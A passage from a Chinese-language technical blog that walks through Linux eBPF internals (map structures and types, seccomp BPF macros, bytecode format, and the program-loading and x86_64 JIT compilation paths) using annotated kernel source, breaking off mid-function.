<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> &#123;</span></span><br><span class="line">	<span class="comment">/* The first two cachelines with read-mostly members of which some</span></span><br><span class="line"><span class="comment">	 * are also accessed in fast-path (e.g. ops, max_entries).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span> ____<span class="title">cacheline_aligned</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">inner_map_meta</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">bpf_map_type</span> <span class="title">map_type</span>;</span> <span class="comment">/* map的数据结构类型 */</span></span><br><span class="line">	u32 key_size; <span class="comment">/* 以字节为单位的用以索引一个元素的key的size(在数组映射中使用) */</span></span><br><span class="line">	u32 value_size; <span class="comment">/* 以字节为单位的每个元素的size */</span></span><br><span class="line">	u32 max_entries; <span class="comment">/* map中entries的最大数量 */</span></span><br><span class="line">	u32 map_flags; <span class="comment">/* 描述map的独特特征(例如是否整个map的内存应被预先分配等) */</span></span><br><span class="line">	<span class="keyword">int</span> spin_lock_off; <span class="comment">/* &gt;=0 valid offset, &lt;0 error */</span></span><br><span class="line">	u32 id;</span><br><span class="line">	<span class="keyword">int</span> numa_node;</span><br><span class="line">	u32 btf_key_type_id;</span><br><span class="line">	u32 btf_value_type_id;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG_KMEM</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">	u32 btf_vmlinux_value_type_id;</span><br><span class="line">	<span class="keyword">bool</span> bypass_spec_v1;</span><br><span class="line">	<span class="keyword">bool</span> frozen; <span class="comment">/* write-once; write-protected by freeze_mutex */</span></span><br><span class="line">	<span class="comment">/* 22 bytes hole */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* The 3rd and 4th cacheline with misc members to avoid false sharing</span></span><br><span class="line"><span class="comment">	 * particularly with refcounting.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">atomic64_t</span> refcnt ____cacheline_aligned;</span><br><span class="line">	<span class="keyword">atomic64_t</span> usercnt;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">freeze_mutex</span>;</span></span><br><span class="line">	u64 writecnt; <span class="comment">/* writable mmap cnt; protected by freeze_mutex */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>bpf map 有多种类型，记录于 <code>bpf_map_type</code> 枚举中： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_map_type</span> &#123;</span></span><br><span class="line">	BPF_MAP_TYPE_UNSPEC,</span><br><span class="line">	BPF_MAP_TYPE_HASH, <span class="comment">/* 以哈希表形式存储键值对(最常见) */</span></span><br><span class="line">	BPF_MAP_TYPE_ARRAY, <span class="comment">/* 以数组形式存储键值对,key即为数组下标,value初始化为&#x27;0&#x27; */</span></span><br><span class="line">	BPF_MAP_TYPE_PROG_ARRAY, <span class="comment">/* 特殊的数组映射,value为其他eBPF程序的文件描述符 */</span></span><br><span class="line">	BPF_MAP_TYPE_PERF_EVENT_ARRAY,</span><br><span class="line">	BPF_MAP_TYPE_PERCPU_HASH,</span><br><span class="line">	BPF_MAP_TYPE_PERCPU_ARRAY,</span><br><span class="line">	BPF_MAP_TYPE_STACK_TRACE,</span><br><span class="line">	BPF_MAP_TYPE_CGROUP_ARRAY,</span><br><span class="line">	BPF_MAP_TYPE_LRU_HASH,</span><br><span class="line">	BPF_MAP_TYPE_LRU_PERCPU_HASH,</span><br><span class="line">	BPF_MAP_TYPE_LPM_TRIE,</span><br><span class="line">	BPF_MAP_TYPE_ARRAY_OF_MAPS,</span><br><span class="line">	BPF_MAP_TYPE_HASH_OF_MAPS,</span><br><span class="line">	BPF_MAP_TYPE_DEVMAP,</span><br><span class="line">	BPF_MAP_TYPE_SOCKMAP,</span><br><span class="line">	BPF_MAP_TYPE_CPUMAP,</span><br><span class="line">	BPF_MAP_TYPE_XSKMAP,</span><br><span class="line">	BPF_MAP_TYPE_SOCKHASH,</span><br><span class="line">	BPF_MAP_TYPE_CGROUP_STORAGE,</span><br><span class="line">	BPF_MAP_TYPE_REUSEPORT_SOCKARRAY,</span><br><span class="line">	BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE,</span><br><span class="line">	BPF_MAP_TYPE_QUEUE,</span><br><span class="line">	BPF_MAP_TYPE_STACK, <span class="comment">/* 以栈形式存储数据 */</span></span><br><span class="line">	BPF_MAP_TYPE_SK_STORAGE,</span><br><span class="line">	BPF_MAP_TYPE_DEVMAP_HASH,</span><br><span class="line">	BPF_MAP_TYPE_STRUCT_OPS,</span><br><span class="line">	BPF_MAP_TYPE_RINGBUF,</span><br><span class="line">	BPF_MAP_TYPE_INODE_STORAGE,</span><br><span class="line">	BPF_MAP_TYPE_TASK_STORAGE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>Seccomp BPF</strong></p>
<p>柏克莱封包过滤器（Berkeley Packet Filter，缩写 BPF），是类 Unix 系统上数据链路层的一种原始接口，提供原始链路层封包的收发，除此之外，如果网卡驱动支持洪泛模式，那么它可以让网卡处于此种模式，这样可以收到网络上的所有包，不管他们的目的地是不是所在主机 </p>
<p>Seccomp BPF 是一种基于 Linux 内核的 BPF 过滤器，用于对 Linux 进程的系统调用进行过滤和拦截（eBPF 的一部分）</p>
<p>BPF 的指令集比较简单，开发人员定义了符号常量和两个方便的宏 <code>BPF_STMT</code> 和 <code>BPF_JUMP</code> 可以用来方便的编写 BPF 规则 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BPF_STMT(BPF_LD | BPF_W | BPF_ABS,(offsetof(struct seccomp_data, arch)))</span><br></pre></td></tr></table></figure>
<ul>
<li><code>BPF_LD</code>：建一个 BPF 加载操作 </li>
<li><code>BPF_W</code>：操作数大小是一个字</li>
<li><code>BPF_ABS</code>：使用绝对偏移，即使用指令中的值作为数据区的偏移量，该值是体系结构字段与数据区域的偏移量 </li>
<li><code>offsetof()</code>：生成数据区域中期望字段的偏移量 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K ,AUDIT_ARCH_X86_64 , <span class="number">1</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>BPF_JMP | BPF JEQ</code> 会创建一个相等跳转指令，它将指令中的值（即第二个参数）与累加器中的值（BPF_K）进行比较，判断是否相等<ul>
<li>如果架构是则跳过下一条指令（jt=1，代表测试为真，跳过一条指令）</li>
<li>否则将执行下一条指令（jf=0，代表测试为假，继续执行下一条指令）</li>
</ul>
</li>
</ul>
<p>用户编写的 eBPF 程序最终会被编译成 eBPF 字节码，eBPF 字节码使用 <code>bpf_insn</code> 结构来表示，如下： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> &#123;</span></span><br><span class="line">	__u8	code;		<span class="comment">/* 操作码 */</span></span><br><span class="line">	__u8	dst_reg:<span class="number">4</span>;	<span class="comment">/* 目标寄存器 */</span></span><br><span class="line">	__u8	src_reg:<span class="number">4</span>;	<span class="comment">/* 源寄存器 */</span></span><br><span class="line">	__s16	off;		<span class="comment">/* 偏移量 */</span></span><br><span class="line">	__s32	imm;		<span class="comment">/* 立即操作数 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>eBPF 程序会被 LLVM/Clang 编译成 <code>bpf_insn</code> 结构数组，这里使用了 JIT 即时编译技术（PS：当 eBPF 字节码被加载到内核时，内核会根据是否开启了 JIT 功能选项，来决定是否将 eBPF 字节码编译成机器码）</p>
<p>内核通过 <code>bpf_prog_load</code> 函数来加载 eBPF 字节码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr, <span class="keyword">union</span> bpf_attr __user *uattr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">bpf_prog_type</span> <span class="title">type</span> =</span> attr-&gt;prog_type;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span> *<span class="title">prog</span>;</span> <span class="comment">/* 保存eBPF程序的信息 */</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="keyword">char</span> license[<span class="number">128</span>];</span><br><span class="line">	<span class="keyword">bool</span> is_gpl;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* plain bpf_prog allocation */</span></span><br><span class="line">	prog = bpf_prog_alloc(bpf_prog_size(attr-&gt;insn_cnt), GFP_USER); <span class="comment">/* 初始化bpf_prog结构体  */</span></span><br><span class="line">	<span class="keyword">if</span> (!prog)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* run eBPF verifier */</span></span><br><span class="line">	err = bpf_check(&amp;prog, attr, uattr);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">	prog = bpf_prog_select_runtime(prog, &amp;err); <span class="comment">/* 判断并使用jit进行编译 */</span></span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">	err = bpf_prog_alloc_id(prog);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> free_used_maps;</span><br><span class="line">    </span><br><span class="line">	bpf_prog_kallsyms_add(prog);</span><br><span class="line">	perf_event_bpf_event(prog, PERF_BPF_EVENT_PROG_LOAD, <span class="number">0</span>);</span><br><span class="line">	bpf_audit_prog(prog, BPF_AUDIT_LOAD);</span><br><span class="line"></span><br><span class="line">	err = bpf_prog_new_fd(prog);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		bpf_prog_put(prog);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">free_used_maps:</span><br><span class="line">	<span class="comment">/* In case we have subprogs, we need to wait for a grace</span></span><br><span class="line"><span class="comment">	 * period before we can tear down JIT memory since symbols</span></span><br><span class="line"><span class="comment">	 * are already exposed under kallsyms.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	__bpf_prog_put_noref(prog, prog-&gt;aux-&gt;func_cnt);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">free_prog:</span><br><span class="line">	bpf_prog_uncharge_memlock(prog);</span><br><span class="line">free_prog_sec:</span><br><span class="line">	security_bpf_prog_free(prog-&gt;aux);</span><br><span class="line">free_prog_nouncharge:</span><br><span class="line">	bpf_prog_free(prog);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>bpf_prog_load</code> 会调用 <code>bpf_prog_select_runtime</code> 函数来判断是否使用 JIT</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_prog *<span class="title">bpf_prog_select_runtime</span><span class="params">(struct bpf_prog *fp, <span class="keyword">int</span> *err)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (fp-&gt;bpf_func)</span><br><span class="line">		<span class="keyword">goto</span> finalize;</span><br><span class="line"></span><br><span class="line">	bpf_prog_select_func(fp);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!bpf_prog_is_dev_bound(fp-&gt;aux)) &#123;</span><br><span class="line">		*err = bpf_prog_alloc_jited_linfo(fp);</span><br><span class="line">		<span class="keyword">if</span> (*err)</span><br><span class="line">			<span class="keyword">return</span> fp;</span><br><span class="line"></span><br><span class="line">		fp = bpf_int_jit_compile(fp); <span class="comment">/* 判断是否需要将eBPF字节码编译成机器码 */</span></span><br><span class="line">		<span class="keyword">if</span> (!fp-&gt;jited) &#123;</span><br><span class="line">			bpf_prog_free_jited_linfo(fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_BPF_JIT_ALWAYS_ON</span></span><br><span class="line">			*err = -ENOTSUPP;</span><br><span class="line">			<span class="keyword">return</span> fp;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			bpf_prog_free_unused_jited_linfo(fp);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		*err = bpf_prog_offload_compile(fp);</span><br><span class="line">		<span class="keyword">if</span> (*err)</span><br><span class="line">			<span class="keyword">return</span> fp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">finalize:</span><br><span class="line">	bpf_prog_lock_ro(fp);</span><br><span class="line"></span><br><span class="line">	*err = bpf_check_tail_call(fp);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(bpf_prog_select_runtime);</span><br></pre></td></tr></table></figure>
<ul>
<li>对于不同的架构，函数 <code>bpf_int_jit_compile</code> 有不同的实现</li>
<li>这里我们只分析 x86_64 架构下的 <code>bpf_int_jit_compile</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_prog *<span class="title">bpf_int_jit_compile</span><span class="params">(struct bpf_prog *prog)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_binary_header</span> *<span class="title">header</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span> *<span class="title">tmp</span>, *<span class="title">orig_prog</span> =</span> prog;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">x64_jit_data</span> *<span class="title">jit_data</span>;</span></span><br><span class="line">	<span class="keyword">int</span> proglen, oldproglen = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">jit_context</span> <span class="title">ctx</span> =</span> &#123;&#125;;</span><br><span class="line">	<span class="keyword">bool</span> tmp_blinded = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">bool</span> extra_pass = <span class="literal">false</span>;</span><br><span class="line">	u8 *image = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> *addrs;</span><br><span class="line">	<span class="keyword">int</span> pass;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!prog-&gt;jit_requested) <span class="comment">/* 判断是否支持jit */</span></span><br><span class="line">		<span class="keyword">return</span> orig_prog;</span><br><span class="line"></span><br><span class="line">	tmp = bpf_jit_blind_constants(prog);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If blinding was requested and we failed during blinding,</span></span><br><span class="line"><span class="comment">	 * we must fall back to the interpreter.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(tmp))</span><br><span class="line">		<span class="keyword">return</span> orig_prog;</span><br><span class="line">	<span class="keyword">if</span> (tmp != prog) &#123;</span><br><span class="line">		tmp_blinded = <span class="literal">true</span>;</span><br><span class="line">		prog = tmp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	jit_data = prog-&gt;aux-&gt;jit_data;</span><br><span class="line">	<span class="keyword">if</span> (!jit_data) &#123;</span><br><span class="line">		jit_data = kzalloc(<span class="keyword">sizeof</span>(*jit_data), GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!jit_data) &#123;</span><br><span class="line">			prog = orig_prog;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">		prog-&gt;aux-&gt;jit_data = jit_data;</span><br><span class="line">	&#125;</span><br><span class="line">	addrs = jit_data-&gt;addrs;</span><br><span class="line">	<span class="keyword">if</span> (addrs) &#123;</span><br><span class="line">		ctx = jit_data-&gt;ctx;</span><br><span class="line">		oldproglen = jit_data-&gt;proglen;</span><br><span class="line">		image = jit_data-&gt;image;</span><br><span class="line">		header = jit_data-&gt;header;</span><br><span class="line">		extra_pass = <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">goto</span> skip_init_addrs;</span><br><span class="line">	&#125;</span><br><span class="line">	addrs = kmalloc_array(prog-&gt;len + <span class="number">1</span>, <span class="keyword">sizeof</span>(*addrs), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!addrs) &#123;</span><br><span class="line">		prog = orig_prog;</span><br><span class="line">		<span class="keyword">goto</span> out_addrs;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Before first pass, make a rough estimation of addrs[]</span></span><br><span class="line"><span class="comment">	 * each BPF instruction is translated to less than 64 bytes</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">for</span> (proglen = <span class="number">0</span>, i = <span class="number">0</span>; i &lt;= prog-&gt;len; i++) &#123;</span><br><span class="line">		proglen += <span class="number">64</span>;</span><br><span class="line">		addrs[i] = proglen;</span><br><span class="line">	&#125;</span><br><span class="line">	ctx.cleanup_addr = proglen;</span><br><span class="line">skip_init_addrs:</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * JITed image shrinks with every pass and the loop iterates</span></span><br><span class="line"><span class="comment">	 * until the image stops shrinking. Very large BPF programs</span></span><br><span class="line"><span class="comment">	 * may converge on the last pass. In such case do one more</span></span><br><span class="line"><span class="comment">	 * pass to emit the final image.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">for</span> (pass = <span class="number">0</span>; pass &lt; <span class="number">20</span> || image; pass++) &#123;</span><br><span class="line">		proglen = do_jit(prog, addrs, image, oldproglen, &amp;ctx); <span class="comment">/* 将eBPF字节码编译成本地机器码 */</span></span><br><span class="line">		<span class="keyword">if</span> (proglen &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">out_image:</span><br><span class="line">			image = <span class="literal">NULL</span>;</span><br><span class="line">			<span class="keyword">if</span> (header)</span><br><span class="line">				bpf_jit_binary_free(header);</span><br><span class="line">			prog = orig_prog;</span><br><span class="line">			<span class="keyword">goto</span> out_addrs;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (image) &#123;</span><br><span class="line">			<span class="keyword">if</span> (proglen != oldproglen) &#123;</span><br><span class="line">				pr_err(<span class="string">&quot;bpf_jit: proglen=%d != oldproglen=%d\n&quot;</span>,</span><br><span class="line">				       proglen, oldproglen);</span><br><span class="line">				<span class="keyword">goto</span> out_image;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (proglen == oldproglen) &#123;</span><br><span class="line">			u32 align = __alignof__(struct exception_table_entry);</span><br><span class="line">			u32 extable_size = prog-&gt;aux-&gt;num_exentries *</span><br><span class="line">				<span class="keyword">sizeof</span>(struct exception_table_entry);</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* allocate module memory for x86 insns and extable */</span></span><br><span class="line">			header = bpf_jit_binary_alloc(roundup(proglen, align) + extable_size,</span><br><span class="line">						      &amp;image, align, jit_fill_hole);</span><br><span class="line">			<span class="keyword">if</span> (!header) &#123;</span><br><span class="line">				prog = orig_prog;</span><br><span class="line">				<span class="keyword">goto</span> out_addrs;</span><br><span class="line">			&#125;</span><br><span class="line">			prog-&gt;aux-&gt;extable = (<span class="keyword">void</span> *) image + roundup(proglen, align);</span><br><span class="line">		&#125;</span><br><span class="line">		oldproglen = proglen;</span><br><span class="line">		cond_resched();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (bpf_jit_enable &gt; <span class="number">1</span>)</span><br><span class="line">		bpf_jit_dump(prog-&gt;len, proglen, pass + <span class="number">1</span>, image); <span class="comment">/* 打印eBPF字节码编译后的机器码 */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (image) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!prog-&gt;is_func || extra_pass) &#123;</span><br><span class="line">			bpf_tail_call_direct_fixup(prog);</span><br><span class="line">			bpf_jit_binary_lock_ro(header);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			jit_data-&gt;addrs = addrs;</span><br><span class="line">			jit_data-&gt;ctx = ctx;</span><br><span class="line">			jit_data-&gt;proglen = proglen;</span><br><span class="line">			jit_data-&gt;image = image;</span><br><span class="line">			jit_data-&gt;header = header;</span><br><span class="line">		&#125;</span><br><span class="line">		prog-&gt;bpf_func = (<span class="keyword">void</span> *)image; <span class="comment">/* 将eBPF执行函数设置成编译后的机器码 */</span></span><br><span class="line">		prog-&gt;jited = <span class="number">1</span>;</span><br><span class="line">		prog-&gt;jited_len = proglen;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		prog = orig_prog;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!image || !prog-&gt;is_func || extra_pass) &#123;</span><br><span class="line">		<span class="keyword">if</span> (image)</span><br><span class="line">		